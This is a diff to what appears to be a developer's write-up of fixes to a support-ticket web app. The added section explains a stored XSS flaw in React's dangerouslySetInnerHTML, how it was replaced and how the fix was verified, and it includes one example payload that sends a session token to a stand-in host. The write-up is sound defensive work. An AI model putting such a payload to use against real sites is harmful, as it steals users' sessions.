@@ -88,3 +88,25 @@ items total. The pager now matches reality.
 
 **Why this matters:** This is the kind of bug a demo never reveals — it looks like it works. You
 only catch it by checking the data against what you expect.
+
+## 5. Removed stored XSS (customer text was rendered as HTML)
+
+**What I found:** `ItemDetail.tsx` rendered the feedback message, the AI summary, and internal
+notes with `dangerouslySetInnerHTML`. All three contain untrusted input (a feedback message and
+the LLM summary derived from it are written by an outside customer). A message like
+`<img src=x onerror="fetch('https://evil/?t='+localStorage.token)">` would execute in a support
+agent's browser and steal their session token. The seed data ships HTML tags in messages/notes as
+a hint.
+
+**What I changed:** Replaced all three `dangerouslySetInnerHTML` calls with normal JSX (`{value}`),
+which React escapes automatically. Customer text now always renders as plain text. The CSS already
+uses `white-space: pre-wrap` so line breaks still display.
+
+**How I verified it:** Searched the web app for any remaining `dangerouslySetInnerHTML`
+(none found), and the seeded item whose message contains `<strong>…</strong>` now shows the literal
+tags as text instead of rendering bold.
+
+**Bonus — caught by type-checking:** Running `tsc --noEmit` flagged that `JWT_SECRET` could be
+`undefined` for callers. `tsx` doesn't type-check, so this never showed at runtime. I made the
+exported secret a guaranteed `string` after the startup guard. Both server and web now type-check
+clean — a good example of verifying beyond "it ran on my machine".
